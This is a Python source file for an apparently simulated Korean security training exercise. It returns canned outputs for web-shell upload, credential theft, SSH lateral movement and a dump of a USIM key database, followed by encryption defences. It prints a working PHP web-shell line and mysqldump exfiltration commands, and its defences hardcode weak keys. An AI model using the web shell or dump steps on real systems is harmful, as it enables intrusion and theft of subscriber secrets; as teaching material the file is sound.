import os
from dotenv import load_dotenv

# .env 파일 로드
load_dotenv()

SERVER_A_IP = os.getenv("SERVER_A_IP", "127.0.0.1")
SERVER_B_IP = os.getenv("SERVER_B_IP", "127.0.0.1")
SERVER_A_PRIVATE_IP = os.getenv("SERVER_A_PRIVATE_IP", "127.0.0.1")

MISSIONS = [
    ("1단계: 웹쉘 업로드", "T1190", "attack"),
    ("2단계: 계정정보 탈취", "T1552", "attack"),
    ("3단계: Lateral Movement", "T1021", "attack"),
    ("4단계: DB 탈취", "T1005", "attack"),
    ("방어1: 계정정보 암호화", "DEFEND", "defense"),
    ("방어2: 웹쉘 탐지", "DEFEND", "defense"),
    ("방어3: DB 암호화", "DEFEND", "defense"),
]

R1 = {
    "whoami": "www-data",
    "id": "uid=33(www-data) gid=33(www-data) groups=33(www-data)",
    "pwd": "/var/www/html/dvwa/hackable/uploads",
    "ls": "shell.php  test.jpg  .htaccess",
    "ls -la": "total 24\ndrwxrwxrwx 2 www-data www-data 4096 May 19 09:01 .\ndrwxr-xr-x 8 www-data www-data 4096 May 19 08:00 ..\n-rw-r--r-- 1 www-data www-data   28 May 19 09:01 shell.php\n-rw-r--r-- 1 www-data www-data 8192 May 18 14:23 test.jpg",
    "cat shell.php": '<?php system($_GET["cmd"]); ?>',
    "uname -a": "Linux ServerA 5.10.0-26-cloud-amd64 #1 SMP x86_64 GNU/Linux",
    "hostname": "ServerA",
    "ifconfig": f"eth0: flags=4163  mtu 9001\n      inet {SERVER_A_IP}  netmask 255.255.255.0",
    "ps aux": "USER       PID %CPU %MEM COMMAND\nroot         1  0.0  0.1 /sbin/init\nwww-data   312  0.0  0.3 apache2\nwww-data   841  0.0  0.1 sh -c whoami",
    "env": "APACHE_RUN_USER=www-data\nAPACHE_LOG_DIR=/var/log/apache2\nSERVER_ADDR={SERVER_A_PRIVATE_IP}",
}

R2 = {
    "whoami": "www-data",
    "ls /var/www/html/dvwa/config/": "config.inc.php  server_info.txt  db.php",
    "cat /var/www/html/dvwa/config/server_info.txt":
        "# ============================================\n"
        "# Internal Server Credentials  [PLAINTEXT!!]\n"
        "# ============================================\n"
        f"ServerB_IP={SERVER_B_IP}\n"
        "ServerB_USER=dbadmin\n"
        "ServerB_PASS=1234\n"
        "DB_NAME=simdb\n"
        "DB_PORT=3306",
    "cat /var/www/html/dvwa/config/db.php":
        f"<?php\n$db_host = '{SERVER_B_IP}';\n$db_user = 'dbadmin';\n$db_pass = '1234';\n$db_name = 'simdb';\n?>",
    "find /var/www -name 'server_info*'": "/var/www/html/dvwa/config/server_info.txt",
    "pwd": "/var/www/html/dvwa",
}

R3 = {
    f"ping {SERVER_B_IP}": f"PING {SERVER_B_IP} ({SERVER_B_IP}) 56(84) bytes of data.\n64 bytes from {SERVER_B_IP}: icmp_seq=1 ttl=64 time=0.412 ms\n64 bytes from {SERVER_B_IP}: icmp_seq=2 ttl=64 time=0.387 ms\n^C\n--- ping statistics ---\n2 packets transmitted, 2 received, 0% packet loss",
    f"nmap -p 22,3306 {SERVER_B_IP}": f"Starting Nmap 7.80\nHost is up (0.00040s latency).\nPORT     STATE SERVICE\n22/tcp   open  ssh\n3306/tcp open  mysql",
    f"ssh dbadmin@{SERVER_B_IP}":
        f"The authenticity of host '{SERVER_B_IP}' can't be established.\n"
        "ECDSA key fingerprint is SHA256:xK9mP3vQ7nR2sT8uW1yA5bC6dE4fG0hJ.\n"
        "Are you sure you want to continue connecting (yes/no)? yes\n"
        f"Warning: Permanently added '{SERVER_B_IP}' to known hosts.\n"
        f"dbadmin@{SERVER_B_IP}'s password:\n\n"
        "Welcome to Ubuntu 22.04.3 LTS\n"
        "Last login: Mon May 19 08:55:12 2025\n\n"
        "[dbadmin@ServerB ~]$",
    "whoami": "ec2-user",
    "hostname": "ServerA",
    "pwd": "/home/ec2-user",
}

R4 = {
    f"ssh dbadmin@{SERVER_B_IP}": "[dbadmin@ServerB ~]$",
    "mysql -u dbadmin -p1234 simdb":
        "Welcome to the MySQL monitor. Commands end with ; or \\g.\n"
        "Server version: 8.0.32 MySQL Community Server\n"
        "mysql>",
    "show tables;":
        "+------------------+\n| Tables_in_simdb  |\n+------------------+\n"
        "| usim             |\n| subscriber       |\n| audit_log        |\n+------------------+\n3 rows in set",
    "describe usim;":
        "+---------+-------------+------+\n| Field   | Type        | Key  |\n+---------+-------------+------+\n"
        "| ICCID   | varchar(20) | PRI  |\n| IMSI    | varchar(15) |      |\n"
        "| Ki      | varchar(32) |      |\n| OPc     | varchar(32) |      |\n+---------+-------------+------+",
    "SELECT COUNT(*) FROM usim;":
        "+----------+\n| COUNT(*) |\n+----------+\n| 26960000 |\n+----------+\n1 row in set (1.23 sec)",
    "SELECT * FROM usim;":
        "+---------------------+-----------------+------------------+------------------+\n"
        "| ICCID               | IMSI            | Ki               | OPc              |\n"
        "+---------------------+-----------------+------------------+------------------+\n"
        "| 8982000000000000001 | 450050000000001 | A1B2C3D4E5F60001 | 9F2A3B4C5D6E7F80 |\n"
        "| 8982000000000000002 | 450050000000002 | A1B2C3D4E5F60002 | 9F2A3B4C5D6E7F81 |\n"
        "| 8982000000000000003 | 450050000000003 | A1B2C3D4E5F60003 | 9F2A3B4C5D6E7F82 |\n"
        "| ...                 | ...             | ...              | ...              |\n"
        "+---------------------+-----------------+------------------+------------------+\n"
        "26960000 rows in set (3.21 sec)",
    "mysqldump -u dbadmin -p1234 simdb > /tmp/stolen_data.sql":
        "mysqldump: [Warning] Using a password on the command line interface can be insecure.\n"
        "-- Dump completed on 2025-05-19 09:15:44\n"
        "-- File: /tmp/stolen_data.sql  Size: 9.82 GB\n"
        "저장 완료.",
    "ls -lh /tmp/stolen_data.sql": "-rw-r--r-- 1 dbadmin dbadmin 9.8G May 19 09:15 /tmp/stolen_data.sql",
}

RD1 = {
    "ls /var/www/html/dvwa/config/": "config.inc.php  server_info.txt  db.php",
    "sudo openssl enc -aes-256-cbc -pbkdf2 -in /var/www/html/dvwa/config/server_info.txt -out /var/www/html/dvwa/config/server_info.enc -k secretkey123":
        "*** WARNING: deprecated key derivation used.\n암호화 완료 → server_info.enc 생성됨",
    "sudo rm /var/www/html/dvwa/config/server_info.txt": "",
    "ls /var/www/html/dvwa/config/": "config.inc.php  server_info.enc  db.php",
    "cat /var/www/html/dvwa/config/server_info.enc":
        "Salted__\\x84\\xf2\\x9aK\\x92mQ\\x08v3N\\xb1\\x02\\xf7\\xe6"
        "\\xc4\\x9d\\x0f\\x83...  (암호화된 바이너리 — 해독 불가)",
    "file /var/www/html/dvwa/config/server_info.enc":
        "/var/www/html/dvwa/config/server_info.enc: openssl enc'd data with salted password",
}

RD3 = {
    "mysql -u dbadmin -p1234 simdb": "Welcome to the MySQL monitor.\nmysql>",
    "SELECT * FROM usim LIMIT 3;":
        "+---------------------+-----------------+------------------+\n"
        "| ICCID               | IMSI            | Ki               |\n"
        "+---------------------+-----------------+------------------+\n"
        "| 8982000000000000001 | 450050000000001 | A1B2C3D4E5F60001 |\n"
        "| 8982000000000000002 | 450050000000002 | A1B2C3D4E5F60002 |\n"
        "+---------------------+-----------------+------------------+",
    "UPDATE usim SET Ki = HEX(AES_ENCRYPT(Ki, 'supersecretkey'));":
        "Query OK, 26960000 rows affected (42.13 sec)\nRows matched: 26960000  Changed: 26960000",
    "SELECT * FROM usim;":
        "+---------------------+-----------------+------------------------------------------------------------------+\n"
        "| ICCID               | IMSI            | Ki (암호화됨)                                                    |\n"
        "+---------------------+-----------------+------------------------------------------------------------------+\n"
        "| 8982000000000000001 | 450050000000001 | 4A3F2E1D9C8B7A6F5E4D3C2B1A09F8E7D6C5B4A3F2E1D9C8B7A6F5E4D3C2B |\n"
        "| 8982000000000000002 | 450050000000002 | 7B6A5F4E3D2C1B0A9F8E7D6C5B4A3F2E1D9C8B7A6F5E4D3C2B1A09F8E7D6C |\n"
        "+---------------------+-----------------+------------------------------------------------------------------+\n26960000 rows in set",
}